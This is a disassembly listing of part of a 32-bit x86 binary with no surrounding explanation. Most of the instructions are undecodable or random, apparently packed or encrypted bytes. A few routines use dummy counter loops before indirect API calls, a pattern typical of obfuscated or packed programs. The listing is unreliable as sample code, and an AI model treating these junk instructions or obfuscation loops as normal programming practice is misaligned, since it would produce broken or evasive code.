  403fb9:	mov    ecx,0x23a3a76c
  403fbe:	xor    eax,DWORD PTR [ebp+0xb]
  403fc1:	loopne 0x403f51
  403fc3:	out    dx,eax
  403fc4:	enter  0xc004,0x4f
  403fc8:	aas    
  403fc9:	dec    edx
  403fca:	sub    BYTE PTR [esi-0xd928c98],dh
  403fd0:	popa   
  403fd1:	and    al,0xf2
  403fd3:	stc    
  403fd4:	not    DWORD PTR [ebx+0x6a]
  403fd7:	cmc    
  403fd8:	sbb    esp,esi
  403fda:	gs inc ebp
  403fdc:	jo     0x403f98
  403fde:	je     0x403f8d
  403fe0:	sub    bh,ah
  403fe2:	and    ch,BYTE PTR [esi]
  403fe4:	ret    
  403fe5:	xchg   al,dl
  403fe7:	xchg   ebp,eax
  403fe8:	sub    edx,DWORD PTR [ebx+0x3b]
  403feb:	jb     0x403f75
  403fed:	arpl   di,sp
  403fef:	test   DWORD PTR [ecx-0x5dcb10bb],edx
  403ff5:	lods   al,BYTE PTR ds:[esi]
  403ff6:	mov    edi,0x7bb1a923
  403ffb:	mov    gs,WORD PTR [eiz*2-0x6ee27486]
  404002:	mov    dh,0x3a
  404004:	test   edi,0x80105797
  40400a:	sbb    DWORD PTR [eiz*4-0x11577ac3],ebx
  404011:	adc    eax,0x877b28e2
  404016:	dec    ecx
  404017:	or     eax,0x98feecaa
  40401c:	ror    ecx,1
  40401e:	repnz out 0x7,al
  404021:	jg     0x404007
  404023:	scas   eax,DWORD PTR es:[edi]
  404024:	cwde   
  404025:	mov    ebx,0xbfae348e
  40402a:	cmp    DWORD PTR ds:0x9545f399,ecx
  404030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404031:	sub    DWORD PTR [eax-0x79],ebx
  404034:	std    
  404035:	aaa    
  404036:	xor    cl,BYTE PTR [edx+0x67f29a05]
  40403c:	dec    ecx
  40403d:	push   eax
  40403e:	sbb    DWORD PTR [ebx+0x65dc7da6],esp
  404044:	and    ebx,DWORD PTR ds:0x1e6119c4
  40404a:	les    edx,FWORD PTR [eax-0x45140bcf]
  404050:	cmp    DWORD PTR [esi-0x525e923e],ebp
  404056:	jle    0x4040c0
  404058:	inc    esp
  404059:	cmp    ecx,DWORD PTR [eax+0x336be62b]
  40405f:	lods   eax,DWORD PTR ds:[esi]
  404060:	cmp    BYTE PTR [edi+ebp*1+0x69860872],dh
  404067:	mov    esi,0x79c4f888
  40406c:	fld    st(2)
  40406e:	dec    ebx
  40406f:	xchg   edi,eax
  404070:	stos   DWORD PTR es:[edi],eax
  404071:	test   eax,0xa24258fb
  404076:	push   edx
  404077:	sahf   
  404078:	add    al,BYTE PTR [ecx+0x2eda8647]
  40407e:	xor    al,0x71
  404080:	xor    eax,DWORD PTR [ebx+0x3cd2078d]
  404086:	fs int 0x45
  404089:	dec    esi
  40408a:	xor    ecx,DWORD PTR [ecx]
  40408c:	outs   dx,DWORD PTR ds:[esi]
  40408d:	(bad)  
  40408e:	add    al,0xa6
  404090:	mov    esi,0x6b0a86da
  404095:	mov    ds:0xf24783f6,al
  40409a:	stos   BYTE PTR es:[edi],al
  40409b:	mov    esi,0xe9d2456f
  4040a0:	pop    ebp
  4040a1:	clc    
  4040a2:	jno    0x4040a9
  4040a4:	adc    ebx,ebp
  4040a6:	imul   esp,DWORD PTR [edx-0x1fa88cdb],0xffffffd8
  4040ad:	jbe    0x4040e3
  4040af:	pop    es
  4040b0:	cld    
  4040b1:	xor    ah,ah
  4040b3:	adc    bh,bh
  4040b5:	in     eax,dx
  4040b6:	scas   al,BYTE PTR es:[edi]
  4040b7:	mov    ds:0xa735cd51,eax
  4040bc:	mov    bl,0x81
  4040be:	jne    0x4040b4
  4040c0:	mov    ?,ebp
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xebf7e6c1
  4040e3:	jle    0x40406f
  4040e5:	dec    esi
  4040e6:	sahf   
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404086
  4040ef:	imul   eax,DWORD PTR [esi+0x671bfa36],0xb192d20a
  4040f9:	xchg   BYTE PTR ss:[eax-0x79],bl
  4040fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040fe:	retf   0x3a3
  404101:	cmp    eax,0x7fd64d0f
  404106:	mov    eax,0x444e86d0
  40410b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40410c:	inc    edi
  40410d:	and    DWORD PTR [edx+esi*1],esp
  404110:	mov    bh,0x54
  404112:	and    ah,BYTE PTR [ebx+0x712e7fba]
  404118:	unpcklps xmm6,xmm0
  40411b:	dec    esi
  40411c:	xchg   edx,eax
  40411d:	mov    eax,0x861d952d
  404122:	jl     0x40410f
  404124:	cs cs and ch,bh
  404128:	push   0xb86a2cfb
  40412d:	ins    DWORD PTR es:[edi],dx
  40412e:	adc    ah,BYTE PTR [eax]
  404130:	dec    ebx
  404132:	dec    ebp
  404133:	dec    edx
  404134:	stos   BYTE PTR es:[edi],al
  404135:	call   0xfb66:0x6b75f641
  40413c:	adc    bh,BYTE PTR [edx+ebp*2+0x694664e5]
  404143:	mov    dl,0xd8
  404145:	stos   DWORD PTR es:[edi],eax
  404146:	stc    
  404147:	sbb    bh,BYTE PTR [edi+0x7123a997]
  40414d:	jp     0x404147
  40414f:	fcom   QWORD PTR [ecx+0x61]
  404152:	push   0xe91a7243
  404157:	das    
  404158:	popa   
  404159:	push   ecx
  40415a:	sub    edi,ebp
  40415c:	push   cs
  40415d:	inc    ebp
  40415e:	cmp    dl,BYTE PTR [esi+0x4f]
  404161:	out    dx,eax
  404162:	adc    al,0x71
  404164:	jo     0x404162
  404166:	pop    ss
  404167:	or     esi,DWORD PTR [ebx-0x64734c7e]
  40416d:	xchg   ebx,eax
  40416e:	add    al,0xb
  404170:	js     0x40413e
  404172:	hlt    
  404173:	out    0x36,al
  404175:	pop    esp
  404176:	xchg   edi,eax
  404177:	push   es
  404178:	leave  
  404179:	loop   0x40419f
  40417b:	mov    ebx,DWORD PTR [edx-0x79]
  40417e:	daa    
  40417f:	or     ebp,edi
  404181:	cmp    BYTE PTR [ebx-0x68],dl
  404184:	mov    ds:0x252b6850,al
  404189:	mov    bh,0x31
  40418b:	mov    bh,0x0
  40418d:	xchg   esp,eax
  40418e:	sbb    DWORD PTR [edi-0x36434172],edx
  404194:	mov    esp,0x80c44f37
  404199:	dec    esp
  40419a:	ins    BYTE PTR es:[edi],dx
  40419b:	stos   DWORD PTR es:[edi],eax
  40419c:	inc    ebx
  40419d:	dec    edx
  40419e:	inc    esp
  40419f:	pop    ecx
  4041a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a1:	and    bh,BYTE PTR [ebx]
  4041a3:	bnd jg 0x4041c1
  4041a6:	cli    
  4041a7:	sub    edx,DWORD PTR es:[edx-0x4dd558c]
  4041ae:	stos   BYTE PTR es:[edi],al
  4041af:	out    dx,eax
  4041b0:	arpl   WORD PTR [ebp+0x18],di
  4041b3:	ficomp WORD PTR [ebx-0x54a47e5a]
  4041b9:	pop    edi
  4041ba:	dec    ecx
  4041bb:	push   cs
  4041bc:	sub    eax,0x90ee6538
  4041c1:	mov    ebp,0x4fe7d2b9
  4041c6:	dec    edx
  4041c7:	enter  0xb87f,0x71
  4041cb:	fcomp  DWORD PTR [esi]
  4041cd:	lock aaa 
  4041cf:	or     DWORD PTR [ebp+0x3e87dcfc],0x8547f8a1
  4041d9:	jl     0x40422a
  4041db:	xor    eax,0x1bfcffd5
  4041e0:	pop    eax
  4041e1:	mov    DWORD PTR [edi],edi
  4041e3:	xor    DWORD PTR [edi],edi
  4041e5:	push   ds
  4041e6:	pop    esi
  4041e7:	or     BYTE PTR ds:0xea00d3a1,al
  4041ed:	push   edi
  4041ee:	pop    edi
  4041ef:	mov    bl,dl
  4041f1:	ret    
  4041f2:	xlat   BYTE PTR gs:[ebx]
  4041f4:	push   cs
  4041f5:	idiv   DWORD PTR [edi+0x10017284]
  4041fb:	outs   dx,DWORD PTR ds:[esi]
  4041fc:	rcl    BYTE PTR [edi+0x61],cl
  4041ff:	and    al,0x89
  404201:	pop    ebp
  404202:	sbb    dl,BYTE PTR [eax+0x4e208bb0]
  404208:	mov    ch,0xfc
  40420a:	xor    eax,eax
  40420c:	jns    0x40427b
  40420e:	imul   esp,esp,0x0
  404211:	test   al,dl
  404213:	dec    edi
  404214:	mov    bl,BYTE PTR [ecx]
  404216:	iret   
  404217:	dec    edi
  404218:	push   edi
  404219:	jb     0x40419f
  40421b:	outs   dx,BYTE PTR ds:[esi]
  40421c:	imul   edi,DWORD PTR [ecx-0x21],0x85bb0241
  404223:	xor    bl,dl
  404225:	push   ebp
  404226:	pop    esi
  404227:	mov    edx,0x7c4bc447
  40422c:	and    al,0xe4
  40422e:	jmp    0x6b90:0x934f4eec
  404235:	jmp    0x404212
  404237:	outs   dx,BYTE PTR ds:[esi]
  404238:	fist   WORD PTR [ebp+ebx*8-0xe5a9fca]
  40423f:	xor    DWORD PTR [edx+0x5818a4df],eax
  404245:	push   esi
  404246:	imul   esi,DWORD PTR [edi+0x9],0xe4751bbb
  40424d:	popf   
  40424e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40424f:	push   edi
  404250:	lock jmp 0x40424f
  404253:	sbb    al,0x7a
  404255:	jge    0x404222
  404257:	inc    edi
  404258:	mov    esi,0x1f1b6203
  40425d:	shl    DWORD PTR [eax+0x72164634],cl
  404263:	aad    0x4d
  404265:	sub    eax,0xe3d1f999
  40426a:	sbb    ah,cl
  40426c:	jle    0x40424c
  40426e:	mov    esp,0x12935d3c
  404273:	int    0x94
  404275:	fidivr DWORD PTR [ecx]
  404277:	rcr    ebp,1
  404279:	scas   eax,DWORD PTR es:[edi]
  40427a:	sub    al,0x1
  40427c:	ins    DWORD PTR es:[edi],dx
  40427d:	call   0xdc20:0x28ad2edd
  404284:	mov    dl,BYTE PTR [ecx-0x1b]
  404287:	pop    ebx
  404288:	jne    0x4042cb
  40428a:	add    eax,0x4e0ec0c1
  40428f:	jbe    0x40429d
  404291:	out    0x5f,eax
  404293:	push   ebx
  404294:	pop    eax
  404295:	je     0x404294
  404297:	mov    ah,0xe3
  404299:	(bad)  
  40429b:	loop   0x404241
  40429d:	out    dx,al
  40429e:	into   
  40429f:	cmc    
  4042a0:	les    edx,FWORD PTR [ebx+0xb]
  4042a3:	leave  
  4042a4:	mov    ds:0xd5f7ab7b,al
  4042a9:	(bad)  
  4042aa:	jo     0x40427d
  4042ac:	in     al,0x12
  4042ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042af:	add    dl,BYTE PTR [edi+0x4d]
  4042b2:	fdiv   st,st(5)
  4042b4:	stos   BYTE PTR es:[edi],al
  4042b5:	or     eax,0xd7f28c9b
  4042ba:	mov    bl,0x19
  4042bc:	push   edx
  4042bd:	add    dh,BYTE PTR [eax]
  4042bf:	jl     0x4042cc
  4042c1:	les    esi,FWORD PTR [ecx+ebx*1+0x7fc309ee]
  4042c8:	jns    0x40430b
  4042ca:	mov    edx,0x5a2fdf28
  4042cf:	and    DWORD PTR [ebx-0xee23db9],edi
  4042d5:	popf   
  4042d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d7:	push   ebp
  4042d8:	outs   dx,BYTE PTR ds:[esi]
  4042d9:	std    
  4042da:	pushf  
  4042db:	add    BYTE PTR [ecx+0x6d],0x46
  4042df:	aaa    
  4042e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e1:	iret   
  4042e2:	add    dl,BYTE PTR [esi+0x5f]
  4042e5:	fist   WORD PTR [ecx+0x7ac588db]
  4042eb:	cmp    ah,BYTE PTR [edi-0x44]
  4042ee:	mov    bl,0x24
  4042f0:	jne    0x40427b
  4042f2:	(bad)  
  4042f3:	jb     0x4042af
  4042f5:	not    DWORD PTR [edx]
  4042f7:	pop    edi
  4042f8:	sub    bh,BYTE PTR [edi]
  4042fa:	mov    edi,DWORD PTR [edx]
  4042fc:	inc    edx
  4042fd:	and    DWORD PTR [esi+edx*2],ebx
  404300:	push   es
  404301:	or     cl,ah
  404303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404304:	mov    bl,0x40
  404306:	into   
  404307:	jge    0x4042b6
  404309:	jecxz  0x404356
  40430b:	cmc    
  40430c:	xor    DWORD PTR [edi+0x9fde773],esi
  404312:	retf   
  404313:	pop    ecx
  404314:	jge    0x4042e0
  404316:	xchg   ch,ah
  404318:	jne    0x4042f4
  40431a:	dec    edi
  40431b:	loopne 0x404379
  40431d:	std    
  40431e:	adc    BYTE PTR [ecx],ah
  404320:	data16 loopne 0x404314
  404323:	in     al,dx
  404324:	mov    eax,ds:0x9f224b1
  404329:	ja     0x404324
  40432b:	cld    
  40432c:	xlat   BYTE PTR ds:[ebx]
  40432d:	jnp    0x404366
  40432f:	shl    DWORD PTR [edi],cl
  404331:	lock inc ecx
  404333:	dec    eax
  404334:	mov    edi,DWORD PTR [esp+ebx*4+0x6f]
  404338:	fidivr DWORD PTR [eax+ecx*8+0x49ece5ae]
  40433f:	std    
  404340:	aad    0xd7
  404342:	jg     0x40437b
  404344:	mov    ss,WORD PTR ss:0xa1937de8
  40434b:	xchg   esp,eax
  40434c:	loop   0x4042f8
  40434e:	xchg   edx,eax
  40434f:	ss ds ja 0x4043b2
  404353:	cmc    
  404354:	pop    ecx
  404355:	loope  0x4042ef
  404357:	jp     0x4042f1
  404359:	cmp    al,BYTE PTR [edi]
  40435b:	and    eax,0x3165c40
  404360:	cld    
  404361:	aam    0x68
  404363:	jmp    DWORD PTR [eax+0x357ab496]
  404369:	rcr    DWORD PTR [esi+0xab631f7],1
  40436f:	ror    DWORD PTR [ecx+0xc458b08],cl
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	and    al,0x37
  40441b:	lods   eax,DWORD PTR ds:[esi]
  40441c:	dec    ebx
  40441d:	sbb    al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x40445c
  404426:	push   ds
  404427:	cwde   
  404428:	loopne 0x4043f1
  40442a:	aad    0x1a
  40442c:	dec    ebp
  40442d:	(bad)  
  40442e:	gs or  cl,bh
  404431:	test   BYTE PTR [ecx+0x5e384a4d],bl
  404437:	inc    ecx
  404438:	jg     0x40449d
  40443a:	sub    esi,esi
  40443c:	pop    ecx
  40443d:	sar    cl,0x2b
  404440:	sbb    al,0x5
  404442:	mov    bl,0xd2
  404444:	sbb    esi,DWORD PTR es:[edi-0xc48a5a1]
  40444b:	repz fst DWORD PTR [edx]
  40444e:	fmul   QWORD PTR [esi+0x34c57576]
  404454:	ret    0xe4dc
  404457:	ret    0xd01c
  40445a:	loopne 0x40441b
  40445c:	popa   
  40445d:	iret   
  40445e:	in     al,0xc
  404460:	adc    eax,0xc2f036e
  404465:	pop    ebp
  404466:	into   
  404467:	push   ebx
  404468:	xchg   DWORD PTR [ecx+ebp*2],esp
  40446b:	imul   edi,DWORD PTR [ebx+0x77a01ee2],0xffffff95
  404472:	jmp    0xda31:0xec5984f7
  404479:	enter  0x5491,0x76
  40447d:	mov    eax,0x4fb8d789
  404482:	adc    DWORD PTR [ebp+0x63],0xb061e844
  404489:	psllw  mm3,QWORD PTR [ecx+eiz*8]
  40448d:	aam    0x95
  40448f:	loopne 0x40442e
  404491:	or     dh,BYTE PTR [esi-0x1c29182]
  404497:	aas    
  404498:	sub    DWORD PTR [esi+0x5c],edi
  40449b:	call   0x3d1532c6
  4044a0:	cmp    BYTE PTR [edx+0x1],0xb7
  4044a4:	or     al,0x2b
  4044a6:	cmp    esp,eax
  4044a8:	add    esi,DWORD PTR [edi-0x34]
  4044ab:	hlt    
  4044ac:	lock mov ch,0x36
  4044af:	leave  
  4044b0:	adc    eax,0xf8ac7f86
  4044b5:	bound  ebx,QWORD PTR [esi]
  4044b7:	ins    BYTE PTR es:[edi],dx
  4044b8:	dec    edx
  4044b9:	mov    cl,0xb
  4044bb:	je     0x404445
  4044bd:	stos   DWORD PTR es:[edi],eax
  4044be:	test   eax,0x9cf0293f
  4044c3:	push   ds
  4044c4:	push   esi
  4044c5:	pushf  
  4044c6:	scas   al,BYTE PTR es:[edi]
  4044c7:	ins    BYTE PTR es:[edi],dx
  4044c8:	adc    eax,0xaee19dee
  4044cd:	popa   
  4044ce:	int3   
  4044cf:	in     al,0x5b
  4044d1:	mov    ?,WORD PTR [edi+eax*4]
  4044d4:	cmp    al,0xcb
  4044d6:	mov    BYTE PTR [ebp-0x6e69139b],ch
  4044dc:	retf   
  4044dd:	or     esp,DWORD PTR [ebx+0x7840f5]
  4044e3:	aad    0xda
  4044e5:	aad    0x9d
  4044e7:	fdiv   DWORD PTR ds:0x48624055
  4044ed:	mov    ah,bl
  4044ef:	or     al,0x93
  4044f1:	data16 aaa 
  4044f3:	push   cs
  4044f4:	fcmovne st,st(5)
  4044f6:	(bad)  
  4044f7:	in     eax,dx
  4044f8:	xchg   esi,eax
  4044f9:	loop   0x4044ca
  4044fb:	cmp    al,0xaa
  4044fd:	push   0xd4566fcd
  404502:	mov    ebp,DWORD PTR [esi+0x23a37514]
  404508:	inc    eax
  404509:	jno    0x6eaf557d
  40450f:	sub    eax,0xdece8ab2
  404514:	(bad)  
  404515:	sahf   
  404516:	std    
  404517:	shr    DWORD PTR [esi-0x3971abd4],cl
  40451d:	es mov eax,0xbcd422bb
  404523:	int3   
  404524:	aam    0xf2
  404526:	or     al,0x5a
  404528:	ja     0x40456d
  40452a:	ret    
  40452b:	inc    ebx
  40452c:	mov    ebp,0x3d2db769
  404531:	jbe    0x4044ee
  404533:	pop    ss
  404534:	fsub   DWORD PTR [ebx+0x5aeb5348]
  40453a:	cmp    al,0x11
  40453d:	sbb    ah,ah
  40453f:	lods   eax,DWORD PTR ds:[esi]
  404540:	clc    
  404541:	mov    ebp,0xa625c5e4
  404546:	pop    ss
  404547:	xor    ecx,esp
  404549:	ret    
  40454a:	xlat   BYTE PTR ds:[ebx]
  40454b:	data16 or al,0x66
  40454e:	mov    edi,DWORD PTR [esi]
  404550:	je     0x404563
  404552:	or     ch,BYTE PTR [ebx-0x72]
  404555:	cs xchg ecx,eax
  404557:	add    DWORD PTR [esi-0xe320c53],ecx
  40455d:	mov    edx,0x690a97f5
  404562:	pop    ebx
  404563:	inc    esi
  404564:	mov    bh,0x8f
  404566:	fstp   DWORD PTR [edi+0x7e]
  404569:	rcl    DWORD PTR [esi-0x2d],1
  40456c:	sub    al,0xd5
  40456e:	int3   
  40456f:	mov    ds:0xad905e05,al
  404574:	add    BYTE PTR [esi-0x60abf0a2],bh
  40457a:	xchg   edi,eax
  40457b:	sub    eax,0x636daff8
  404580:	add    al,0x4d
  404582:	pop    edi
  404583:	cmp    BYTE PTR [ebp-0x5d],ah
  404586:	add    BYTE PTR [edx+0x58],0x75
  40458a:	ret    0xa00e
  40458d:	ins    BYTE PTR es:[edi],dx
  40458e:	mov    dh,0x4
  404590:	imul   eax,DWORD PTR [edi],0xd062c856
  404596:	cwde   
  404597:	push   ecx
  404598:	shr    BYTE PTR [esi],1
  40459a:	arpl   WORD PTR [ebp-0x4ba4521d],bp
  4045a0:	adc    BYTE PTR [edx+esi*4-0x5a4a94e4],cl
  4045a7:	pop    ebp
  4045a8:	rol    DWORD PTR [edx-0x57309925],0x2b
  4045af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045b0:	add    edi,DWORD PTR [esi]
  4045b2:	xor    eax,0x651b63d0
  4045b7:	add    eax,esp
  4045b9:	sbb    eax,DWORD PTR ds:0x9643f278
  4045bf:	sbb    BYTE PTR [esi+eiz*8+0xa],al
  4045c3:	add    al,0xed
  4045c5:	jo     0x404629
  4045c7:	mov    esp,0xa41b3ad7
  4045cc:	mov    ch,0x1
  4045ce:	cld    
  4045cf:	call   0x8652:0x9a45ff40
  4045d6:	jmp    0xc4d6:0x118fc95c
  4045dd:	pop    ds
  4045de:	push   cs
  4045df:	jo     0x404562
  4045e1:	in     al,0x5f
  4045e3:	call   0xa4aa:0xb82364d5
  4045ea:	lods   al,BYTE PTR ds:[esi]
  4045eb:	jl     0x404638
  4045ed:	xchg   edx,eax
  4045ee:	iret   
  4045ef:	inc    esi
  4045f0:	mov    dh,0x2b
  4045f2:	sti    
  4045f3:	mov    dl,0xa4
  4045f5:	cmp    edx,DWORD PTR [ebp-0x42]
  4045f8:	dec    edi
  4045f9:	xor    DWORD PTR [esi-0x2e],0x77
  4045fd:	mov    edi,0x36c90e87
  404602:	xchg   BYTE PTR [ebx+0x50],dl
  404605:	adc    DWORD PTR [ebx-0x6c],edi
  404608:	mov    ch,0xba
  40460a:	mov    cl,0xd0
  40460c:	xchg   ebp,eax
  40460d:	and    al,0x6e
  40460f:	loop   0x4045f8
  404611:	popf   
  404612:	jmp    0x40463c
  404614:	sbb    BYTE PTR [ebx+0x73],ch
  404617:	hlt    
  404618:	sbb    ecx,DWORD PTR [eax-0x22a78fd5]
  40461e:	adc    BYTE PTR [ecx+0x7fdb0694],0xe
  404625:	jmp    0xb8a3:0xc6fc05ab
  40462c:	dec    edx
  40462d:	mov    eax,0x873232d5
  404632:	lods   eax,DWORD PTR ds:[esi]
  404633:	dec    ecx
  404634:	addr16 xchg ecx,eax
  404636:	in     eax,dx
  404637:	mov    cl,0x77
  404639:	ins    DWORD PTR es:[edi],dx
  40463a:	adc    edx,DWORD PTR [ebx-0x7b]
  40463d:	in     eax,dx
  40463e:	xor    ebp,edx
  404640:	adc    DWORD PTR [ebp-0x2d4fa76a],ebp
  404646:	dec    ecx
  404647:	into   
  404648:	push   es
  404649:	jno    0x40467a
  40464b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40464c:	inc    esi
  40464d:	js     0x40465f
  40464f:	out    dx,al
  404650:	test   al,0x2d
  404652:	not    ch
  404654:	push   esi
  404655:	in     eax,dx
  404656:	out    dx,al
  404657:	adc    DWORD PTR [ebx],ebx
  404659:	pop    esp
  40465a:	ret    0x6623
  40465d:	(bad)  
  40465e:	in     al,dx
  40465f:	retf   0x30d7
  404662:	xchg   esi,eax
  404663:	in     eax,0x5
  404665:	aam    0x30
  404667:	xchg   esp,eax
  404668:	adc    al,0xe6
  40466a:	in     al,0xd9
  40466c:	pop    edx
  40466d:	dec    esi
  40466e:	mov    ebx,esi
  404670:	fadd   st,st(1)
  404672:	push   es
  404673:	iret   
  404674:	adc    DWORD PTR [ebp+0x5cc17541],esi
  40467a:	aad    0xda
  40467c:	fnstenv [esi]
  40467e:	adc    DWORD PTR [eax+0x14d9aef3],edx
  404684:	mov    BYTE PTR [edi+0x3d],al
  404687:	push   0xc24c296c
  40468c:	cmc    
  40468d:	jnp    0x404663
  40468f:	or     BYTE PTR [esi+0x47],ah
  404692:	iret   
  404693:	sbb    eax,ebp
  404695:	out    dx,al
  404696:	pusha  
  404697:	inc    ecx
  404698:	retf   0x1843
  40469b:	sub    esp,ebx
  40469d:	scas   al,BYTE PTR es:[edi]
  40469e:	lahf   
  40469f:	(bad)  
  4046a0:	push   esi
  4046a1:	lods   eax,DWORD PTR ds:[esi]
  4046a2:	shl    DWORD PTR [ecx+eiz*1-0x27fe89de],0x2b
  4046aa:	add    DWORD PTR [ecx],ecx
  4046ac:	shl    BYTE PTR [ecx+0x71],cl
  4046af:	test   eax,0x6b273f07
  4046b4:	xchg   BYTE PTR [eax+esi*2],bl
  4046b7:	repnz push ebp
  4046ba:	inc    ebp
  4046bb:	cmp    eax,0xe03c8089
  4046c0:	(bad)  
  4046c1:	mov    bh,0x30
  4046c3:	sbb    DWORD PTR [eax+0x16],eax
  4046c6:	add    al,0xd2
  4046c8:	rcr    ecx,cl
  4046ca:	mov    WORD PTR [edi+0x6d],es
  4046cd:	push   edx
  4046ce:	rcl    DWORD PTR [edx+0x15],cl
  4046d1:	outs   dx,DWORD PTR ds:[esi]
  4046d2:	lods   al,BYTE PTR ds:[esi]
  4046d3:	les    ecx,FWORD PTR [edi+0x1d7fa57]
  4046d9:	arpl   WORD PTR [edi],bx
  4046db:	xchg   ebx,eax
  4046dc:	mov    bx,fs
  4046df:	pushf  
  4046e0:	sub    ebx,edi
  4046e2:	mov    dh,0xe7
  4046e4:	cmc    
  4046e5:	mov    BYTE PTR [edi-0x25],0xc1
  4046e9:	leave  
  4046ea:	aad    0x32
  4046ec:	pop    edx
  4046ed:	loope  0x404723
  4046ef:	clc    
  4046f0:	cmp    BYTE PTR [ebp+0x39bc39ca],bh
  4046f6:	rol    esi,cl
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x3a4a83de
  404770:	pop    es
  404771:	cmp    DWORD PTR [ecx+0x29],esi
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40478e
  40477b:	shl    BYTE PTR [eax],cl
  40477d:	(bad)  
  40477e:	adc    dl,al
  404780:	test   al,0x69
  404782:	das    
  404783:	inc    ebp
  404784:	mov    esp,0x92dd44d7
  404789:	jp     0x404767
  40478b:	(bad)  
  40478c:	das    
  40478d:	mov    ecx,0xf9f43d73
  404792:	jge    0x40473b
  404794:	dec    ecx
  404795:	cmp    ch,BYTE PTR es:[edx-0x3f416a25]
  40479c:	push   edi
  40479d:	push   0x43674fbb
  4047a2:	mov    ch,0xd6
  4047a4:	jns    0x404821
  4047a6:	cmc    
  4047a7:	lea    eax,[ebx+edx*4]
  4047aa:	sub    dh,BYTE PTR [ebp+0x75de1656]
  4047b0:	mov    al,0x25
  4047b2:	inc    edi
  4047b3:	add    eax,0x6d1fe79a
  4047b8:	jmp    0x7022eb7c
  4047bd:	test   ebx,esi
  4047bf:	mov    eax,0xb0414258
  4047c4:	jnp    0x404771
  4047c6:	aaa    
  4047c7:	ins    DWORD PTR es:[edi],dx
  4047c8:	mov    ds:0x3b99fdab,al
  4047cd:	xchg   edx,eax
  4047ce:	mov    BYTE PTR [ebp-0x5187e7ab],0x83
  4047d5:	mov    eax,0xdf5863ac
  4047da:	in     al,dx
  4047db:	test   dh,al
  4047dd:	add    DWORD PTR [edi+0x1],eax
  4047e0:	test   DWORD PTR [edi],ecx
  4047e2:	int    0xd8
  4047e4:	sub    ebp,eax
  4047e6:	xchg   ebx,eax
  4047e7:	xchg   DWORD PTR cs:[esi+0x68b4c2fb],ebx
  4047ee:	popa   
  4047ef:	iret   
  4047f0:	sub    BYTE PTR [ebx-0x6266fef7],bh
  4047f6:	xor    BYTE PTR [eax+0x6c10aad7],ah
  4047fc:	daa    
  4047fd:	xchg   edi,eax
